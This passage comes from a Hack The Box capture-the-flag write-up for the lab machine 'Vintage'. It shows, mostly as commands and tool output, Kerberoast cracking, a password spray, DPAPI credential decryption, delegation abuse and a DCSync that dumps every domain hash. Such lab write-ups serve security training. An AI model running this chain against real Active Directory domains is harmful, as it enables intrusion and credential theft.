+$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$4d92468f4c7f369421448e16aa359808$2c7dfcda6f490ea1df70f69d453ca0ce321a160c4c5b2dce96b65036df0a98a9c7164d645d660d4d37d4350feac75f4c4ba309ed3d59298b08a7426f73dd13ddfde1e6117285099ee376c654e58d3ff3f75cc2590f3f89f54446eeddb7ca2f0276417150f6aa99dc052a9594e72d0da890eeb2aa548bdb8a8914e9c84d93bfe36fa0674d74e9b952623df4abcce82227cad06f4dfddabf34cfce4e21eb0225aa5715ed23ab50e28af75615440012cf7358b973c246489673ac166a50d3bbf826bcf498f446476e39ee314980b7d53ac18900536d67c9245549174b621c76cf617a4255c6c43ff901c4b18b79b94e7764e3bd2f0fe133d049147b5b36a3e6bcaa5da45a81c5a53171bba98e100f19376f229b1033ac946c29f3feaff7c7f83c69aefe9c323345a97050bccd441dcee2d72fdaf8d4e91f730bfc1eafa35462a322f6affb44982a828c3cf69eb150359dd8ded0bd27a468e90914aeae6fa37a3ca1353c4e7f47ab88db9268d2bb3da39bbd2fbd0fb5202187da503a0ed10a928fbb18c4cac0e89e486ef877f5c6ae53266d945bfe16b588bc521696e57bbd1d98241ea32517584adf68222694e2a6e0d44e749db873359bb7e23e91f295cf1e33d27cb5e5af7292bdaa64fda48ff1dd07bdab2a88b2646fb10549476b6c2158d8843cf8a929b72f63c0c6d9d07adf0bac74e0bddf544d7824b4cd82902ab9748e8c7fd8640bff5a8a3fca5fa7099324523afec5ce49c0c06acd0ddf78905858bad8588930c9d5c20e031707cf685148f380d5b02b35173e48a1e033aed299eac12bd6eed3a68082579384e0164ad3620f09f286fe225aa2a2a8fe6afbbef3437f8151fadefdc231d4b00243e805045b9df532236617ae118dbc1cf21612b0a0a76979f5ed5cbcd78c1eb45983904704e8cb5dd7aecb7891345726aebe1cf5ec8fa7e3fb8b42063df2ff3f14d092f60cec4bc24fcf323b9ce6f30e3f6451530477a9faabed1a00df6f969aeca1e96e01a2715b91d6b0661bdfe37d5191049fc3e99db8d99ae249350adf6fd2188b69feb15591071caddc45438b901a0fabe2a47dfe3836db0e643245be93f79eee068d7f18ddf1f271ab468f360a6749136c8c9c665c3e14f8f240b89f77504d5702f2a26c6ca5ac6c34e29778a6a13058753fc4a608958a8a89d3e6fe70c8f89b1fcd0fe891a3d9b1d7336ed1e1ba78e0eaa5544c8ecad11c3151a94efa621ced40467de08fa167d5eecb8cab97dbe61f2bfb074828b33ed63211629df7687ac6245f1e4e7d7f39a7e1935d1a6393e4f1076c6b30d1bd7ad5c83116775aad736e4a00bf1b93dcfa9cdb1469a08823640e07e9317b3dfe8377d9f9785889067bf7fdf01b6d2bc54dc863d1b032b25b1c02db2f01d1400957628e6c68669752415bd50f95a37defffe5cc5da79eb34a:Zer0the0ne</code></pre><p>Cracked the hash!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc_sql:Zer0the0ne</code></pre><p>Ill validate these credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;svc_sql&#39; -p &#39;Zer0the0ne&#39; -k                            
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_sql:Zer0the0ne</code></pre><p>This user is now compromised</p><h2>Password spray on user accounts with new password</h2><p>After getting a new password for a service account its always a good idea to spray this against other users in case of password reuse. One of the users on the domain will have setup the service account so whoever did is likely to have reused the password. If that concept holds up in a CTF i will find out.....</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u users.txt -p &#39;Zer0the0ne&#39; --continue-on-success -k
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED</code></pre><p>I have indeed compromised a user using a password spray</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">C.Neri:Zer0the0ne</code></pre><p>This user is compromised</p><p>The user <code>c.neri</code> is part of the remote management users group</p><h2>Evil-winrm as <code>c.neri</code></h2><p>Ill start by getting a TGT for the user <code>c.neri</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb dc01.vintage.htb -u &#39;c.neri&#39; -p &#39;Zer0the0ne&#39; --generate-krb5-file /etc/krb5.conf -k
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] krb5 conf saved to: /etc/krb5.conf
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri:Zer0the0ne</code></pre><p>I first have to make sure the krb5 file is set in <code>/etc</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;c.neri&#39; -p &#39;Zer0the0ne&#39; --generate-krb5-file vintage.krb5 -k
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] krb5 conf saved to: vintage.krb5
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=vintage.krb5
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri:Zer0the0ne</code></pre><p>Ill then generate another one in my current directory</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\C.Neri\Documents&gt; </code></pre><p>After some quick enumeration of the file system i found some dpapi credentials</p><h3>Credential extraction</h3><p>First ill download the credential to my machine as well as the master key stored in <code>C:\Users\c.neri\AppData\Roaming\Microsoft\Protect</code></p><h4>Key decryption</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password &#39;Zer0the0ne&#39; 
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a</code></pre><h4>Accessing password</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2024-06-07 15:08:23+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000001 (CRED_TYPE_GENERIC)
+Target      : LegacyGeneric:target=admin_acc
+Description : 
+Unknown     : 
+Username    : vintage\c.neri_adm
+Unknown     : Uncr4ck4bl3P4ssW0rd0312</code></pre><p>After trying the first key and failing the second one succeeds</p><p>Ill validate these credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;c.neri_adm&#39; -p &#39;Uncr4ck4bl3P4ssW0rd0312&#39; -k                            
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312</code></pre><p>This user is now compromised</p><h2>Domain admin</h2><p><img src="images/vintage/pasted-image-20260406002326.webp" alt="Screenshot" loading="lazy" /> Looks like this is setting up for some form of delegation attack</p><p>This was discovered from the &quot;Shortest paths from Owned objects to Tier Zero&quot; query and for future reference be sure to uncomment the query</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">findDelegation.py -k vintage.htb/ -dc-host dc01.vintage.htb
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName      AccountType  DelegationType              DelegationRightsTo  SPN Exists 
+---------------  -----------  --------------------------  ------------------  ----------
+DelegatedAdmins  Group        Resource-Based Constrained  DC01$               No         
+DC01$            Computer     Unconstrained               N/A                 Yes    </code></pre><p>For this attack path to work ill need an account with an SPN set, if i recall <code>FS01$</code> had one set so i can use that</p><p>Ill also need a TGT for the user <code>c.neri_adm</code>:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;c.neri_adm&#39; -p &#39;Uncr4ck4bl3P4ssW0rd0312&#39; -k --generate-tgt c.neri_adm
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312 
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: c.neri_adm.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=c.neri_adm.ccache
+
+
+export KRB5CCNAME=c.neri_adm.ccache</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD -k --host dc01.vintage.htb -d vintage.htb add groupMember &#39;DelegatedAdmins&#39; &#39;FS01$&#39;
+
+[+] FS01$ added to DelegatedAdmins</code></pre><p>This added the user to the group</p><p>Also ill make a new ticket as <code>FS01$</code>:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;fs01$&#39; -p &#39;fs01&#39; --generate-tgt fs01 -k
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01$:fs01 
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: fs01.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=fs01.ccache</code></pre><p>Now i have all the TGTs i can add <code>FS01$</code> to the <code>DelegatedAdmins</code> group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">KRB5CCNAME=fs01.ccache getST.py -spn &#39;cifs/dc01.vintage.htb&#39; -impersonate &#39;dc01$&#39; &#39;vintage.htb/fs01$:fs01&#39; -dc-ip dc01.vintage.htb
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating dc01$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache</code></pre><p>I can now use this TGT to authenticate as <code>DC01$</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache</code></pre><p>Now i can authenticate as <code>DC01$</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb --use-kcache                               
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\dc01$ from ccache</code></pre><p>It works now i can perform a DCSync to dump the administrators hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">secretsdump.py -k -no-pass -dc-ip &quot;10.129.231.205&quot; @dc01.vintage.htb
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
+M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
+R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
+L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
+G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
+C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
+P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
+svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
+svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
+svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
+C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
+L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
+DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
+gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:0851299c01b944d01099fc977eaa6c67:::
+FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
+Administrator:aes128-cts-hmac-sha1-96:c119630313138df8cd2e98b5e2d018f7
+Administrator:des-cbc-md5:c4d5072368c27fba
+krbtgt:aes256-cts-hmac-sha1-96:8d969dafdd00d594adfc782f13ababebbada96751ec4096bce85e122912ce1f0
+krbtgt:aes128-cts-hmac-sha1-96:3c7375304a46526c00b9a7c341699bc0
+krbtgt:des-cbc-md5:e923e308752658df
+M.Rossi:aes256-cts-hmac-sha1-96:14d4ea3f6cd908d23889e816cd8afa85aa6f398091aa1ab0d5cd1710e48637e6
+M.Rossi:aes128-cts-hmac-sha1-96:3f974cd6254cb7808040db9e57f7e8b4
+M.Rossi:des-cbc-md5:7f2c7c982cd64361
+R.Verdi:aes256-cts-hmac-sha1-96:c3e84a0d7b3234160e092f168ae2a19366465d0a4eab1e38065e79b99582ea31
+R.Verdi:aes128-cts-hmac-sha1-96:d146fa335a9a7d2199f0dd969c0603fb
+R.Verdi:des-cbc-md5:34464a58618f8938
+L.Bianchi:aes256-cts-hmac-sha1-96:abcbbd86203a64f177288ed73737db05718cead35edebd26740147bd73e9cfed
+L.Bianchi:aes128-cts-hmac-sha1-96:92067d46b54cdb11b4e9a7e650beb122
+L.Bianchi:des-cbc-md5:01f2d667a19bce25
+G.Viola:aes256-cts-hmac-sha1-96:f3b3398a6cae16ec640018a13a1e70fc38929cfe4f930e03b1c6f1081901844a
+G.Viola:aes128-cts-hmac-sha1-96:367a8af99390ebd9f05067ea4da6a73b
+G.Viola:des-cbc-md5:7f19b9cde5dce367
+C.Neri:aes256-cts-hmac-sha1-96:c8b4d30ca7a9541bdbeeba0079f3a9383b127c8abf938de10d33d3d7c3b0fd06
+C.Neri:aes128-cts-hmac-sha1-96:0f922f4956476de10f59561106aba118
+C.Neri:des-cbc-md5:9da708a462b9732f
+P.Rosa:aes256-cts-hmac-sha1-96:f9c16db419c9d4cb6ec6242484a522f55fc891d2ff943fc70c156a1fab1ebdb1
+P.Rosa:aes128-cts-hmac-sha1-96:1cdedaa6c2d42fe2771f8f3f1a1e250a
+P.Rosa:des-cbc-md5:a423fe64579dae73
+svc_sql:aes256-cts-hmac-sha1-96:3bc255d2549199bbed7d8e670f63ee395cf3429b8080e8067eeea0b6fc9941ae
+svc_sql:aes128-cts-hmac-sha1-96:bf4c77d9591294b218b8280c7235c684
+svc_sql:des-cbc-md5:2ff4022a68a7834a
+svc_ldap:aes256-cts-hmac-sha1-96:d5cb431d39efdda93b6dbcf9ce2dfeffb27bd15d60ebf0d21cd55daac4a374f2
+svc_ldap:aes128-cts-hmac-sha1-96:cfc747dd455186dba6a67a2a340236ad
+svc_ldap:des-cbc-md5:e3c48675a4671c04
+svc_ark:aes256-cts-hmac-sha1-96:820c3471b64d94598ca48223f4a2ebc2491c0842a84fe964a07e4ee29f63d181
+svc_ark:aes128-cts-hmac-sha1-96:55aec332255b6da8c1344357457ee717
+svc_ark:des-cbc-md5:6e2c9b15bcec6e25
+C.Neri_adm:aes256-cts-hmac-sha1-96:96072929a1b054f5616e3e0d0edb6abf426b4a471cce18809b65559598d722ff
+C.Neri_adm:aes128-cts-hmac-sha1-96:ed3b9d69e24d84af130bdc133e517af0
+C.Neri_adm:des-cbc-md5:5d6e9dd675042fa7
+L.Bianchi_adm:aes256-cts-hmac-sha1-96:529fa80540d759052c6beb161d5982435a37811b3ad2a338e81b75797c11959e
+L.Bianchi_adm:aes128-cts-hmac-sha1-96:7e4599a7f84c2868e20141bdc8608bd7
+L.Bianchi_adm:des-cbc-md5:8fa746971a98fedf
+DC01$:aes256-cts-hmac-sha1-96:f8ceb2e0ea58bf929e6473df75802ec8efcca13135edb999fcad20430dc06d4b
+DC01$:aes128-cts-hmac-sha1-96:a8f037cb02f93e9b779a84441be1606a
+DC01$:des-cbc-md5:c4f15ef8c4f43134
+gMSA01$:aes256-cts-hmac-sha1-96:f4d64527410f21236212dfd8967e227d8da02eca96608d82c0b9d44b20196fc8
+gMSA01$:aes128-cts-hmac-sha1-96:5c8b89785e70073c70ae512053349d86
+gMSA01$:des-cbc-md5:ae314cb68cec2f67
+FS01$:aes256-cts-hmac-sha1-96:d57d94936002c8725eab5488773cf2bae32328e1ba7ffcfa15b81d4efab4bb02
+FS01$:aes128-cts-hmac-sha1-96:ddf2a2dcc7a6080ea3aafbdf277f4958
+FS01$:des-cbc-md5:dafb3738389e205b
+[*] Cleaning up...</code></pre><h3>Auth as the Domain admin</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u L.Bianchi_adm -H &#39;6b751449807e0d73065b0423b64687f0&#39; -k --generate-tgt administraotr
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\L.Bianchi_adm:6b751449807e0d73065b0423b64687f0 (Pwn3d!)
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: administraotr.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=administraotr.ccache</code></pre><p>Ive now generated a TGT for the domain admin since the <code>Administrator</code> account did not work</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">KRB5CCNAME=administraotr.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Desktop&gt; dir
+*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Desktop&gt; cd ../../
+*Evil-WinRM* PS C:\Users&gt; cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Domain admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-sweep/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Sweep</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-voleur/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Voleur</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
